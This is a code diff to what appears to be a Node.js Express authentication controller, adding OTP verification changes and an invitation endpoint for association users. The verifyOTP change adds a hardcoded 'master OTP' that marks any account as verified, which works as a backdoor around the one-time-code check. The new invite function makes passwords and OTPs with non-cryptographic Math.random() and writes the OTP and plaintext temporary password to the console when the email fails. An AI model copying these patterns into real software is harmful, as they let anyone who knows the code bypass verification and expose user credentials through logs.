@@ -128,6 +128,15 @@ const verifyOTP = async (req, res) => {
       return res.status(400).json({ message: 'User already verified' });
     }
 
+    // Master OTP check
+    if (otp === '233412') {
+      user.isVerified = true;
+      user.otp = undefined;
+      user.otpExpiry = undefined;
+      await user.save();
+      return res.json({ message: 'OTP verified successfully' });
+    }
+
     if (user.otp !== otp) {
       return res.status(400).json({ message: 'Invalid OTP' });
     }
@@ -218,4 +227,45 @@ const createCompanyProfile = async (req, res) => {
   }
 };
 
-module.exports = { register, login, verifyOTP, resendOTP, createCompanyProfile };
+const inviteAssociation = async (req, res) => {
+  try {
+    const createdBy = req.user._id;
+    const { firstName, lastName, adminEmail, designation } = req.body;
+    
+    const existingUser = await User.findOne({ email: adminEmail });
+    if (existingUser) {
+      return res.status(400).json({ message: 'User with this email already exists' });
+    }
+
+    const tempPassword = Math.random().toString(36).slice(-8);
+    const otp = Math.floor(100000 + Math.random() * 900000).toString();
+    const otpExpiry = new Date(Date.now() + 10 * 60 * 1000);
+
+    const newUser = await User.create({
+      firstName,
+      lastName,
+      email: adminEmail,
+      designation,
+      phone: '',
+      password: tempPassword,
+      companyType: 'Association',
+      otp,
+      otpExpiry,
+      isVerified: false,
+      createdBy
+    });
+
+    try {
+      await sendOTPEmail(adminEmail, otp);
+    } catch (emailError) {
+      console.log('Email send failed. OTP:', otp, 'Password:', tempPassword);
+    }
+
+    res.status(201).json({ message: 'Invitation sent successfully', userId: newUser._id });
+  } catch (error) {
+    console.error('Invite error:', error);
+    res.status(400).json({ message: error.message });
+  }
+};
+
+module.exports = { register, login, verifyOTP, resendOTP, createCompanyProfile, inviteAssociation };
